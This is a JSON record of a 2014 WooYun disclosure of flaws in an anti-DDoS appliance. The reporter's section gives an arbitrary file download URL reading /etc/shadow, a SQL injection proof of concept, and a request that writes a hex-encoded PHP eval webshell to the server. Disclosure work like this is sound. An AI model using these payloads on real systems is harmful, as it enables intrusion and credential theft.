{"id": 4573, "wybug_id": "wooyun-2014-053475", "wybug_title": "中新金盾抗拒绝服务系统GetShell漏洞", "wybug_corp": "安徽中新软件有限公司", "wybug_author": "Tea", "wybug_date": "2014-03-13 00:26", "wybug_open_date": "2014-04-27 00:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["中新金盾抗拒绝服务系统漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-27：\t细节向公众公开  简要描述： 组合起来可GetWebshell 详细说明：  界面版本\t2.3.4系统参数\tGFW-6200 Build #4913需要登录，登录以后可以通过任意文件下载下载服务任意文件，包括/etc/shadow。并且通过任意文件下载漏洞下载源码获得WEB路径。再通过SQL注入漏洞写文件到WEB目录下拿Webshell   漏洞证明：  任意文件下载漏洞：https://1.1.1.1:28XX3/cgi-bin/index.php?t=service&c=download&filepath=/etc/passwdhttps://1.1.1.1:28XX3/cgi-bin/index.php?t=service&c=download&filepath=/etc/shadow\n\nSQL注入漏洞(数量不少，其他文件用的addslashes()呢？咋不用了。)：攻击分析菜单里面的列表-->查询主机，都存在注入，这里只列一个。POC：'and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)#\n\n\n\nGetWebshell:首先通过下载任意文件漏洞下载源码文件，获得Web路径：/xxx/usx/XXXx/再通过SQL注入导出文件到WEB目录：https://1.1.1.1:28XX3/cgi-bin/index.php?t=analysis_attack&c=getAttDetailById&_=1119844506390&o=json&id=-54' Union select 0x3c3f706870206576616c28245f504f53545b277a275d293b3f3e,2,3,4 from mysql.user  into outfile '/xxx/usx/XXXx/z.php'%23\n\n   修复方案：  注入点很多的，请全部仔细排查下。那么多字符型的，你们用过的addslashes()咋不用了?数字型的就强制转吧。任意文件下载。你得限制下载目录以及文件格式吧？   版权声明：转载请注明来源 Tea@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-03-19 09:19 厂商回复： 与http:///bugs/wooyun-2014-一并，已经由CNVD直接联系软件生产厂商，并直接联系到技术部门负责人，向其通报漏洞情况，由生产厂商后续处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-13 08:52 |    \t\t小城 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | 低调，才能活的长久)\t\t \n  哪位，这么吊，卧槽，大牛啊    \n     2014-03-13 12:17 |    \t\t安徽中新软件有限公司(乌云厂商)\t\t \n  大牛，求联系方式    \n     2014-03-13 15:10 |    \t\t0gucci \t\t\t( 普通白帽子  |\t\t\t        Rank:166 漏洞数:33        | 深度值得深入)\t\t \n  0 0我早上找到现在,还没找到    \n     2014-03-17 12:59 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @tea 要查水表了    \n     2014-03-17 16:59 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这是PHP的？    \n     2014-04-16 16:37 |    \t\t小城 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | 低调，才能活的长久)\t\t \n  我看看了，一点都不吊    \n     2014-04-27 11:01 |    \t\tz@cx \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:56        | 。-。-。)\t\t \n  应该是产品比较吊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}